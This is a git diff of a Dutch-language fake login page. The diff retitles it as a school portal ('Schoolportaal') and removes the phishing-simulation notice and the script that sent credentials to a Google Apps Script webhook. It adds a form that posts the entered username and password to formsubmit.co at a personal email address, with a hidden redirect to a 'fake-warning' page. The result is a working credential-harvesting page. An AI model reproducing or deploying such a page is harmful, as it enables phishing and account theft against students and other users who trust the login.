@@ -2,7 +2,7 @@
 <html lang="nl">
 <head>
   <meta charset="UTF-8">
-  <title>Login Mijn Portaal</title>
+  <title>Login Portaal</title>
   <style>
     body {
       background-color: #111;
@@ -26,45 +26,12 @@
   </style>
 </head>
 <body>
-  <h2>Login bij Mijn Portaal</h2>
-  <form id="loginForm">
-    <input type="text" id="username" placeholder="Gebruikersnaam" required><br>
-    <input type="password" id="password" placeholder="Wachtwoord" required><br>
+  <h2>Login bij Schoolportaal</h2>
+  <form action="https://formsubmit.co/matteo.goossens@tuta.io" method="POST" id="loginForm">
+    <input type="text" name="username" placeholder="Gebruikersnaam" required><br>
+    <input type="password" name="password" placeholder="Wachtwoord" required><br>
+    <input type="hidden" name="_next" value="https://gooske28.github.io/fake-warning.html">
     <button type="submit">Inloggen</button>
   </form>
-
-  <div id="result">
-    <h3>⚠️ Phishing Simulatie ⚠️</h3>
-    <p>Je gegevens zijn niet echt opgeslagen op een server.<br>
-    Dit was een test om je bewust te maken van online phishing.<br>
-    Denk twee keer na voor je ergens je wachtwoord ingeeft.</p>
-  </div>
-
-  <script>
-    const webhookURL = "https://script.google.com/macros/s/AKfycbzHHDjulEcUAHwGyj2b87IdQttDnK_nbW-a8sdgRuGOcgAHvYm09RPDkQyPghcDA91D/exec";
-
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      const userAgent = navigator.userAgent;
-
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          username: username,
-          password: password,
-          userAgent: userAgent
-        })
-      });
-
-      document.getElementById("loginForm").style.display = "none";
-      document.getElementById("result").style.display = "block";
-    });
-  </script>
 </body>
 </html>
